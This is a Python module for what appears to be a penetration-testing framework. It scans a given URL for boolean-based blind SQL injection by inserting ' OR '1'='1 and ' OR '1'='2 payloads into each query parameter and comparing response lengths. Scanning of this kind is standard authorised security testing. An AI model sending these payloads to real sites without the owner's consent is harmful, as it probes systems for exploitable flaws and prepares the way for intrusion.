import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.base_module import BaseModule
from rich.console import Console

class SqlInjectionScanner(BaseModule):
    """Scans for basic boolean-based blind SQL injection."""

    def get_options(self):
        """
        Returns the options for this module.
        """
        return {
            'URL': ['', 'The full URL to test (e.g., http://example.com/page.php?id=1).']
        }

    def run(self, options):
        """
        Executes the SQL injection scan.
        """
        target_url = options.get('URL')
        console = Console()

        if not target_url:
            console.print("[!] URL must be set.", style="bold red")
            return

        console.print(f"[*] Testing for SQL injection on URL: {target_url}")

        try:
            parsed_url = urlparse(target_url)
            query_params = parse_qs(parsed_url.query)

            if not query_params:
                console.print("[!] URL has no query parameters to test.", style="bold red")
                return

            vulnerable = False
            for param, values in query_params.items():
                console.print(f"[*] Testing parameter: {param}")
                original_value = values[0]

                # Payload for TRUE condition
                payload_true = f"{original_value}' OR '1'='1"
                # Payload for FALSE condition
                payload_false = f"{original_value}' OR '1'='2"

                # Test with TRUE condition
                temp_params = query_params.copy()
                temp_params[param] = payload_true
                true_url = urlunparse(parsed_url._replace(query=urlencode(temp_params, doseq=True)))
                res_true = requests.get(true_url, timeout=15)

                # Test with FALSE condition
                temp_params[param] = payload_false
                false_url = urlunparse(parsed_url._replace(query=urlencode(temp_params, doseq=True)))
                res_false = requests.get(false_url, timeout=15)

                if len(res_true.content) != len(res_false.content) and res_true.status_code == 200 and res_false.status_code == 200:
                    console.print(f"[bold green][+] Vulnerable! The parameter '{param}' seems to be vulnerable to blind SQLi.[/bold green]")
                    console.print(f"  -> Response length (TRUE): {len(res_true.content)}")
                    console.print(f"  -> Response length (FALSE): {len(res_false.content)}")
                    vulnerable = True
                    break
                else:
                    console.print(f"[yellow]  -> Parameter '{param}' does not seem vulnerable.[/yellow]")

            if not vulnerable:
                console.print("[*] Scan complete. No obvious SQL injection vulnerabilities found.")

        except requests.RequestException as e:
            console.print(f"[!] Request failed: {e}", style="bold red")
        except Exception as e:
            console.print(f"[!] An unexpected error occurred: {e}", style="bold red")
